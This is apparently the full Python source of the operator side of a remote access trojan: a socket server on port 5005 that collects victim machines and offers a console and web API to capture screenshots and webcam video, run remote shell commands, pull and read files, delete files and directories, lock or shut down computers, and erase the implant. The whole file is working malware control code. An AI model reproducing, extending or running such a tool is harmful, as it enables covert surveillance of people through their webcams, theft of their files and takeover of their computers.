# Standard Libraries
from prettytable import PrettyTable
import threading
import socket
import time
import os
import re

# Third-Party Libraries
import webapi

port = 5005
buffer = 16384

clients = []
clientInfo = []

table = PrettyTable()
table.field_names = ["ID", "Computer", "IP Address", "Username", "System", "File"]

def SendAll(connection, data):
    if (isinstance(data, bytes)):
        clients[connection].send(bytes(str(len(data)), "utf-8"))
        if (tcp_connected(connection)):
            clients[connection].send(data)
    else:
        data = str(data, "utf-8")
        clients[connection].send(str(len(data)), "utf-8")
        if (tcp_connected(connection)):
            clients[connection].send(data)

def ReceiveAll(connection, bufferSize, verbose=False):
    data = bytes()

    clients[connection].send(b"success")
    while (len(data) < int(bufferSize)):
        data += clients[connection].recv(int(bufferSize))
        if (verbose):
            print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufferSize)), end="")

    return data

def tcp_connected(connection):
    if (b"success" in clients[connection].recv(buffer)):
        return True

def RemoteConnect():
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    objSocket.bind(("0.0.0.0", port))
    objSocket.listen(socket.SOMAXCONN)

    while (True):
        try:
            conn, address = objSocket.accept()
            clients.append(conn)

            serverDetails = str(conn.recv(buffer), "utf-8").split("\n")
            temp = {}

            temp["computer"] = serverDetails[0]
            temp["username"] = serverDetails[1]
            temp["system"] = serverDetails[2]
            temp["file"] = serverDetails[3]
            temp["ip"] = address[0]
            temp["port"] = address[1]
            clientInfo.append(temp)

        except socket.error:
            objSocket.close()
            del(objSocket)
            RemoteConnect()

def ConnectionCommands():
    print("______________________________________________________")
    print("(Connection Commands)                                 |\n" + \
          "                                                      |")
    print("[clients]         View Connected Clients              |")
    print("[connect <id>]    Connect to Client                   |")
    print("[close <id>]      Terminate Connection                |")
    print("[delete <id>]     Kill Connection & Delete Program    |")
    print("[closeall]        Terminates All Connections          |")
    print("______________________________________________________|")

def ClientCommands():
    print("______________________________________")
    print("(Connection Commands)                 |\n" + \
          "                                      |")
    print("[-apc] Append Connection              |")
    print("______________________________________|")
    print("(User Interface Commands)             |\n" + \
          "                                      |")
    print("[-vmb] Send Message (VBS-Box)         |")
    print("[-cps] Capture Screenshot             |")
    print("[-cpw] Capture Webcam                 |")
    print("[-cwp] Change Wallpaper               |")
    print("______________________________________|")
    print("(System Commands)                     |\n" + \
          "                                      |")
    print("[-vsi] View System Information        |")
    print("[-vrt] View Running Tasks             |")
    print("[-idt] Idle Time                      |")
    print("[-stp] Start Process                  |")
    print("[-klp] Kill Process                   |")
    print("[-rms] Remote CMD                     |")
    print("[-wkc] Wake Computer                  |")
    print("[-sdc] Shutdown Computer              |")
    print("[-rsc] Restart Computer               |")
    print("[-lkc] Lock Computer                  |")
    print("______________________________________|")
    print("(File Commands)                       |\n" + \
          "                                      |")
    print("[-gcd] Get Current Directory          |")
    print("[-wcl] Get Connected Webcams          |")
    print("[-vwf] View Files                     |")
    print("[-sdf] Send File                      |")
    print("[-rvf] Receive File                   |")
    print("[-rdf] Read File                      |")
    print("[-mvf] Move File                      |")
    print("[-dlf] Delete File                    |")
    print("[-dld] Delete Directory               |")
    print("______________________________________|\n")

def VBSMessageBox(connection, message):
    if (len(message) >= 1000):
        print("[-] Maximum Length: 1000 Characters")
        return False

    elif not (len(message) <= 0):
        clients[connection].send(b"msgbox")
        if (tcp_connected(connection)):
            clients[connection].send(bytes(message, "utf-8"))
        
        else: return False

    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
    return True

def CaptureScreenshot(connection):
    clients[connection].send(b"screenshot")

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to Capture Screenshot\n")
        return

    start = time.time()
    print("\nScreenshot Captured")
    try:
        fileContent = ReceiveAll(connection, clients[connection].recv(buffer), True)
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation Error - File May be too Large")

        with open(time.strftime(f"{clientInfo[connection]['computer']}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nImage has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except:
        print("[!] Error Receiving File\n")

    finally:
        return {"image": fileContent, "length": len(fileContent)}

def GetConnectedWebcams(connection):
    clients[connection].send(b"webcam-list")
    response = str(clients[connection].recv(buffer), "utf-8")

    if (response == "NO_WEBCAMS"):
        print("<No Webcams Detected>\n")
        return False
    else:
        print(response)
        return response

def CaptureWebcam(connection, webcamId=None, seconds=None):
    connection = int(connection)
    clients[connection].send(b"webcam")

    devices = str(clients[connection].recv(1024), "utf-8")
    if (devices == "NO_WEBCAMS"):
        print("<No Webcams Detected>\n")
        return False

    cameras = 1
    for device in devices.split("\n"):
        if (len(device) == 0):
            continue

        print(f"{cameras}. {device}")
        cameras += 1

    try:
        cameraID = input("\nChoose Device: ").strip() if webcamId == None else int(webcamId)
        if not int(cameraID) in range(1, cameras):
            print("Unrecognized Webcam ID\n")
            raise ValueError

        clients[connection].send(bytes(str(cameraID), "utf-8"))

        duration = int(input("Capture Duration? (seconds): ").strip()) if seconds == None else int(seconds)
        if (duration < 1 or duration > 30):
            print("Duration Range: 1-30 seconds\n")
            raise ValueError

        clients[connection].send(bytes(str(duration * 1000), "utf-8"))

    except ValueError:
        clients[connection].send(b"0")
        return False

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to Capture Webcam\n")
        return False

    start = time.time()
    print("\nWebcam Captured")
    try:
        fileContent = ReceiveAll(connection, clients[connection].recv(buffer))
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation - File is too Large\n")

        with open(time.strftime(f"{clientInfo[connection]['computer']}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nVideo has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except:
        print("[!] Error Receiving File\n")

    finally:
        return {"image": fileContent, "length": len(fileContent)}

def ChangeWallpaper(connection, file=None):
    localFile = input("\nChoose Local Image File: ").strip() if file == None else file
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return -1

    elif not (re.search(re.compile("[^\\s]+(.*?)\\.(jpg|jpeg|png)$"), localFile)):
        print("[!] Invalid File Type - Required: (JPEG, JPG, PNG)\n")
        return -2

    clients[connection].send(b"wallpaper")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(os.path.basename(localFile), "utf-8"))

    with open(localFile, "rb") as ImageFile:
        fileContent = ImageFile.read()

    print("Sending Image...")
    SendAll(connection, fileContent)

    if not (str(clients[connection].recv(buffer), "utf-8") == "received"):
        print("[!] Unable to Transfer Image\n")
        return -3

    print("Wallpaper Changed\n")
    return True

def SystemInformation(connection):
    print(f"Connection ID:   <{connection}>")
    print(f"Computer:        <{clientInfo[connection]['computer']}>")
    print(f"Username:        <{clientInfo[connection]['username']}>")
    print(f"IP Address:      <{clientInfo[connection]['ip']}>")
    print(f"System:          <{clientInfo[connection]['system']}>\n")

    return {
        "connection_id": connection,
        "computer": clientInfo[connection]['computer'],
        "username": clientInfo[connection]['username'],
        "ip": clientInfo[connection]['ip'],
        "system": clientInfo[connection]['system']
    }

def ViewTasks(connection):
    clients[connection].send(b"tasklist")
    processes = str(ReceiveAll(connection, clients[connection].recv(buffer)), "utf-8")

    print(processes)
    return processes

def IdleTime(connection):
    clients[connection].send(b"idletime")
    time = str(clients[connection].recv(buffer), "utf-8") + "\n"

    print(time)
    return time

def StartProcess(connection, process=None):
    process = input("\nRemote File Path: ").strip() if process == None else process
    clients[connection].send(b"stprocess")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(process, "utf-8"))

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return False

    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
    return True

def KillProcess(connection, process=None):
    process = input("\nTask to Kill: ").strip() if process == None else process
    clients[connection].send(b"klprocess")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(process, "utf-8"))

    print(str(ReceiveAll(connection, clients[connection].recv(buffer)), "utf-8"))
    return True

def RemoteCMD(connection):
    clients[connection].send(b"remote")
    remoteDirectory = str(clients[connection].recv(buffer), "utf-8")

    while (True):
        try:
            command = input(f"\n({clientInfo[connection]['ip']} ~ {remoteDirectory})> ").strip().lower()
            if (command == "exit"):
                raise KeyboardInterrupt

            elif (command == "cls" or command == "clear"):
                os.system("clear" if os.name == "posix" else "cls")

            elif ("start" in command or "tree" in command or "cd" in command or 
                    "cmd" in command or "powershell" in command):

                print("[!] Unable to use this Command")

            elif (len(command) > 0):
                clients[connection].send(bytes(command, "utf-8"))
                output = str(ReceiveAll(connection, clients[connection].recv(buffer)), "utf-8")

                if (len(output) == 0):
                    print("No Output ~ Command Executed")
                else:
                    print(output, end="")

        except KeyboardInterrupt:
            clients[connection].send(b"exit"); print("<Exited Remote CMD>\n")
            break

def WakeComputer(connection):
    clients[connection].send(b"wake-computer")
    if (str(clients[connection].recv(buffer), "utf-8") == "success"):
        print("Computer has been woken\n")
        return True
    else:
        print("Unable to wake Computer\n")
        return False

def ShutdownComputer(connection):
    clients[connection].send(b"shutdown")
    message = f"Powering Off PC ~ [{clientInfo[connection]['ip']}]\n"

    print(message)
    return message

def RestartComputer(connection):
    clients[connection].send(b"restart")
    message = f"Restarting PC ~ [{clientInfo[connection]['ip']}]\n"

    print(message)
    return message

def LockComputer(connection):
    clients[connection].send(b"lock")
    message = f"Locking PC ~ [{clientInfo[connection]['ip']}]\n"
    
    print(message)
    return message

def CurrentDirectory(connection):
    clients[connection].send(b"directory")
    directory = str(clients[connection].recv(buffer), "utf-8").replace("\\", "/") + "\n"

    print(directory)
    return directory

def ViewFiles(connection, directory=None):
    directory = input("\nRemote Folder [-filter]: ").strip() if directory == None else directory
    clients[connection].send(b"files")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(directory, "utf-8"))

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return -1

    clientFiles = ReceiveAll(connection, clients[connection].recv(buffer)).split(b"\n")
    fileCount = -1
    files = str()

    for file in clientFiles:
        try:
            files += str(file, "utf-8") + "\n"
            fileCount += 1
        except UnicodeDecodeError:
            pass

    if (fileCount <= 0):
        print("[!] No Results\n")
        return -2
    else:
        response = "File Count: [{:,}]\nCharacter Count: [{:,}]\n\n{}".format(fileCount, len(files), files)
        print(response, end="")
        return response
        

def SendFile(connection):
    localFile = input("\nLocal File Path: ").strip()
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return
        
    clients[connection].send(b"receive")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(os.path.basename(localFile), "utf-8"))

    with open(localFile, "rb") as file:
        fileContent = file.read()
        
    start = time.time()

    print("Sending File...")
    SendAll(connection, fileContent)

    if not (str(clients[connection].recv(buffer), "utf-8") == "received"):
        print("[!] Unable to Transfer File\n")
        return

    end = time.time()
    
    print("\nFile Sent: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
        (os.path.basename(localFile)), len(fileContent) / 1024, len(fileContent), end - start))
        
def ReceiveFile(connection):
    filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
    clients[connection].send(b"send")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(filePath, "utf-8"))

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return
        
    start = time.time()
    try:
        fileContent = ReceiveAll(connection, clients[connection].recv(buffer))
        fileName = filePath.split("\\")[-1]
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation - File is too Large\n")

        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

        end = time.time()
        print("\n\nFile Received: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            fileName, len(fileContent) / 1024, len(fileContent), end - start))
    
    except: print("[!] Error Receiving File\n")

def ReadFile(connection, filePath=None):
    filePath = input("\nRemote File Path: ").replace("/", "\\").strip() if filePath == None else filePath
    clients[connection].send(b"read")
    if (tcp_connected(connection)):
        clients[connection].send(bytes(filePath, "utf-8"))

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return -1
        
    start = time.time()
    try:
        fileContent = ReceiveAll(connection, clients[connection].recv(buffer))
        fileName = filePath.split("\\")[-1]
        if (fileContent == b"bad_alloc"):
            print("Bad Allocation - File is too Large\n")
            return -2

        end = time.time()
        print("\n\nFile Read: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            fileName, len(fileContent) / 1024, len(fileContent), end - start))

        print("="*100 + f"\n{str(fileContent, 'utf-8')}\n" + "="*100 + "\n")

    except UnicodeDecodeError:
        print("Unable to Display Binary File in Terminal.\nFile has been Downloaded.\n")
        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

    except:
        print("[!] Error Reading File\n")
        return -3

    finally:
        return {"file": fileContent, "length": len(fileContent)}

def MoveFile(connection, filePath=None, remoteDirectory=None):
    clients[connection].send(b"move")

    filePath = input("\nSelect Remote File: ").strip() if filePath == None else filePath
    remoteDirectory = input("\nNew Remote Directory Location: ").strip() if remoteDirectory == None else remoteDirectory

    clients[connection].send(bytes(filePath, "utf-8"))
    if (tcp_connected(connection)):
        clients[connection].send(bytes(remoteDirectory, "utf-8"))

    clientResponse = str(clients[connection].recv(buffer), "utf-8")
    if (clientResponse == "invalid-file"):
        print("[!] Unable to find Remote File\n")
        return -1

    elif (clientResponse == "invalid-directory"):
        print("[!] Unable to find Remote Directory\n")
        return -2

    else:
        print("File has been Moved\n")
        return True

def DeleteFile(connection, filePath=None):
    filePath = input("\nRemote File Path: ").strip() if filePath == None else filePath
    clients[connection].send(b"delfile")

    if (tcp_connected(connection)):
        clients[connection].send(bytes(filePath, "utf-8"))

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return False

    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
    return True

def DeleteDirectory(connection, directory=None):
    directory = input("\nRemote Directory: ").strip() if directory == None else directory
    clients[connection].send(b"deldir")

    if (tcp_connected(connection)):
        clients[connection].send(bytes(directory, "utf-8"))

    if not (str(clients[connection].recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return False

    print(str(clients[connection].recv(buffer), "utf-8") + "\n")
    return True

def adjustTable():
    table.clear_rows()

    for client in clients:
        connection = int(clients.index(client))
        network = client.getpeername()

        table.add_row([
            str(connection),
            clientInfo[connection]['computer'],
            network[0] + ":" + str(network[1]),
            clientInfo[connection]['username'],
            clientInfo[connection]['system'],
            clientInfo[connection]['file']
        ])

def SelectConnection():
    while (True):
        try:
            command = input("\n-> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")
                
            elif (command == "?" or command == "help"):
                ConnectionCommands()

            elif (command == "clients"):
                if (len(clients) == 0):
                    print("<Connections Appear Here>")
                    continue

                temp = []
                for client in clients:
                    try:
                        client.send(b"test")
                        if (client.recv(buffer) == b"success"):
                            continue

                    except ConnectionResetError:
                        temp.append(client)

                for deadClient in temp:
                    dead = int(clients.index(deadClient))

                    if (deadClient in clients):
                        table.del_row(dead)
                        clients.remove(deadClient)
                        del(clientInfo[dead])
                        deadClient.close()
                
                adjustTable()
                if not (len([t for t in table]) == 0):
                    print(table)

            elif (command.split(" ")[0] == "connect"):
                connection = int(command.split(" ")[1])
                client = clients[connection]
                try:
                    client.send(b"test")
                    if (client.recv(buffer) == b"success"):
                        RemoteControl(connection)

                except ConnectionResetError:
                    del(clientInfo[int(clients.index(client))])
                    clients.remove(client)
                    print(f"Failed to Connect: {client.getpeername()[0]}")

            elif (command.split(" ")[0] == "close"):
                connection = int(command.split(" ")[1])
                client = clients[connection]

                try:
                    client.send(b"terminate")
                except ConnectionResetError:
                    pass
                finally:
                    print(f"{client.getpeername()[0]} has been Terminated")
                    del(clientInfo[connection])
                    clients.remove(client)
                    client.close()

            elif (command.split(" ")[0] == "delete"):
                connection = int(command.split(" ")[1])
                client = clients[connection]

                if (input(f"Delete Program off Client {clients.index(client)}'s Computer? (y/n): ").lower().strip() == "y"):
                    try:
                        client.send(b"delself")
                        if (str(client.recv(buffer), "utf-8") == "success"):
                            print(f"Program has been Deleted off Remote Computer ~ [{client.getpeername()[0]}]")

                    except ConnectionResetError:
                        print("Lost Connection to Client: " + client.getpeername()[0])

                    finally:
                        del(clientInfo[connection])
                        clients.remove(client)
                        client.close()

            elif (command == "closeall"):
                if (input("Are you sure? (y/n): ").lower() == "y"):
                    try:
                        for client in clients:
                            client.send(b"terminate")
                            client.close()

                    except ConnectionResetError: pass
                    finally:
                        print(f"All Connections Terminated: [{len(clients)}]")
                        clients.clear()

        except (ValueError, IndexError):
            print("Invalid Connection ID")

        except (ConnectionAbortedError, BrokenPipeError):
            print("[Clients Timed Out] - Reconnecting...")
            for client in clients:
                client.close()

            clients.clear()

        except KeyboardInterrupt:
            break

        finally:
            webapi.api.connection = None
            if (len(clients) == 0):
                clientInfo.clear()

def RemoteControl(connection):
    webapi.api.connection = connection

    print(f"Connected: {clientInfo[connection]['computer']}/{clientInfo[connection]['ip']} ({clients.index(clients[connection])})\n")
    while (True):
        try:
            command = input(f"({clientInfo[connection]['computer']})> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "?" or command == "help"):
                ClientCommands()
                
            elif (command == "-apc"):
                print(f"Appended Connection ~ [{clientInfo[connection]['ip']}]")
                break

            elif (command == "-vmb"):
                VBSMessageBox(connection, input("\nType Message: ").strip())

            elif (command == "-cps"):
                CaptureScreenshot(connection)

            elif (command == '-wcl'):
                GetConnectedWebcams(connection)

            elif (command == "-cpw"):
                CaptureWebcam(connection)

            elif (command == "-cwp"):
                ChangeWallpaper(connection)

            elif (command == "-vsi"):
                SystemInformation(connection)

            elif (command == "-vrt"):
                ViewTasks(connection)

            elif (command == "-idt"):
                IdleTime(connection)

            elif (command == "-stp"):
                StartProcess(connection)

            elif (command == "-klp"):
                KillProcess(connection)

            elif (command == "-rms"):
               RemoteCMD(connection)

            elif (command == "-wkc"):
                WakeComputer(connection)

            elif (command == "-sdc"):
                ShutdownComputer(connection)

            elif (command == "-rsc"):
                RestartComputer(connection)
            
            elif (command == "-lkc"):
                LockComputer(connection)

            elif (command == "-gcd"):
                CurrentDirectory(connection)

            elif (command == "-vwf"):
                ViewFiles(connection)

            elif (command == "-sdf"):
                SendFile(connection)
                
            elif (command == "-rvf"):
                ReceiveFile(connection)

            elif (command == "-rdf"):
                ReadFile(connection)

            elif (command == "-mvf"):
                MoveFile(connection)

            elif (command == "-dlf"):
                DeleteFile(connection)

            elif (command == "-dld"):
                DeleteDirectory(connection)

        except KeyboardInterrupt:
            print("\n[Keyboard Interrupted ~ Connection Appended]")
            break

        except Exception as e:
            print(f"\n[-] Lost Connection to ({clientInfo[connection]['ip']})\n" + f"Error Message: {e}")
            clients.remove(clients[connection])
            del(clientInfo[connection])
            clients[connection].close()
            break

webapi.api.clients = clients
webapi.api.clientInfo = clientInfo

webapi.api.VBSMessageBox = VBSMessageBox
webapi.api.ChangeWallpaper = ChangeWallpaper
webapi.api.CaptureScreenshot = CaptureScreenshot
webapi.api.GetConnectedWebcams = GetConnectedWebcams
webapi.api.CaptureWebcam = CaptureWebcam
webapi.api.SystemInformation = SystemInformation
webapi.api.ViewTasks = ViewTasks
webapi.api.IdleTime = IdleTime
webapi.api.StartProcess = StartProcess
webapi.api.KillProcess = KillProcess
webapi.api.WakeComputer = WakeComputer
webapi.api.ShutdownComputer = ShutdownComputer
webapi.api.RestartComputer = RestartComputer
webapi.api.LockComputer = LockComputer
webapi.api.CurrentDirectory = CurrentDirectory
webapi.api.ViewFiles = ViewFiles
# webapi.api.SendFile = SendFile
# webapi.api.ReceiveFile = ReceiveFile
webapi.api.ReadFile = ReadFile
webapi.api.MoveFile = MoveFile
webapi.api.DeleteFile = DeleteFile
webapi.api.DeleteDirectory = DeleteDirectory

webapi.api.clients_lock = threading.Lock()

t1 = threading.Thread(target=RemoteConnect)
t1.daemon = True
t1.start()

t2 = threading.Thread(target=webapi.api.run)
t2.daemon = True
t2.start()

SelectConnection()